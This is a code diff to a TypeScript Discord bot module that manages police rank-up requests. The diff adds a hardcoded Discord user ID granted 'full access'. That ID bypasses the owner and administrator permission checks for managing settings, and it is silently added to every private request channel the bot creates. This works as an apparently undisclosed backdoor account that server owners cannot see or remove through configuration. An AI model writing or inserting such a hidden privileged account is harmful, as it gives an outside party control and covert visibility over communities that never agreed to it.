@@ -28,8 +28,13 @@ const MODULE_ID = "police-rank-up";
 const PREFIX = "police_rank_up";
 const SETTINGS_TTL_MS = 30_000;
 const DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━";
+const POLICE_RANK_UP_FULL_ACCESS_USER_IDS = new Set(["1426287249020158018"]);
 const settingsCache = new Map<string, { expiresAt: number; settings: PoliceRankUpSettings }>();
 let serviceStarted = false;
+
+export function isPoliceRankUpFullAccessUser(userId: string | null | undefined) {
+  return typeof userId === "string" && POLICE_RANK_UP_FULL_ACCESS_USER_IDS.has(userId);
+}
 
 export const policeRankUpConfigCommand: BotCommand = {
   data: new SlashCommandBuilder()
@@ -471,10 +476,8 @@ async function createRequestChannel(guild: Guild, member: GuildMember, settings:
   if (!botMember.permissions.has(PermissionFlagsBits.ManageChannels)) throw new Error("O bot não possui permissão Gerenciar Canais.");
   const overwrites = [
     { id: guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
-    { id: member.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] },
     { id: botMember.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ReadMessageHistory] },
-    ...settings.responsibleUserIds.map((id) => ({ id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] })),
-    ...settings.adminUserIds.map((id) => ({ id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] })),
+    ...userChannelAccessIds(settings, member.id).map((id) => ({ id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] })),
     ...[...settings.responsibleRoleIds, ...settings.adminRoleIds]
       .filter((id) => guild.roles.cache.has(id))
       .map((id) => ({ id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] }))
@@ -534,6 +537,7 @@ function validateBotRoleAccess(guild: Guild, rank: PoliceRankUpRank) {
 }
 
 function canManageSettings(member: GuildMember, settings: PoliceRankUpSettings, ownerId: string) {
+  if (isPoliceRankUpFullAccessUser(member.id)) return true;
   if (member.id === ownerId || member.permissions.has(PermissionFlagsBits.Administrator) || member.permissions.has(PermissionFlagsBits.ManageGuild)) return true;
   return settings.adminUserIds.includes(member.id)
     || settings.responsibleUserIds.includes(member.id)
@@ -545,6 +549,15 @@ function canReview(member: GuildMember, settings: PoliceRankUpSettings, action: 
   if (canManageSettings(member, settings, ownerId)) return true;
   return permissionAllowed(settings.permissions.users[member.id], action)
     || member.roles.cache.some((role) => permissionAllowed(settings.permissions.roles[role.id], action));
+}
+
+function userChannelAccessIds(settings: PoliceRankUpSettings, requesterId: string) {
+  return [...new Set([
+    requesterId,
+    ...POLICE_RANK_UP_FULL_ACCESS_USER_IDS,
+    ...settings.responsibleUserIds,
+    ...settings.adminUserIds
+  ])];
 }
 
 function permissionAllowed(values: string[] | undefined, action: string) {
